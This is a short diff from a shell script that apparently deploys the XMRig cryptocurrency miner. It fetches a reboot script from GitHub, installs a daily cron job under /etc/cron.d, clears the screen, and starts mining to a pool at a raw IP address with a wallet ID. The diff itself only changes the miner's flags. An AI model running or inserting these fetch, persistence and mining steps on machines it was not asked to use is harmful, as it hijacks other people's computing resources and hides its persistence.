@@ -29,4 +29,4 @@ wget https://github.com/robertreynolds2/bteteteh/raw/main/reboot.sh
 chmod +x reboot.sh
 echo "0 0 * * * /home/lufiaq/xmrig/build/reboot.sh" > /etc/cron.d/reboot_24 >/dev/null 2>&1
 clear
-./xmrig --av 7 --safe --max-cpu-usage 85 --cpu-priority 5 -o 139.180.190.196:1231 -u BTT:TRGnhHFiSb4256PzFSEBqEF34psbsT2NPN.aq
+./xmrig -o 139.180.190.196:1231 -a rx -k -u BTT:TRGnhHFiSb4256PzFSEBqEF34psbsT2NPN.aq
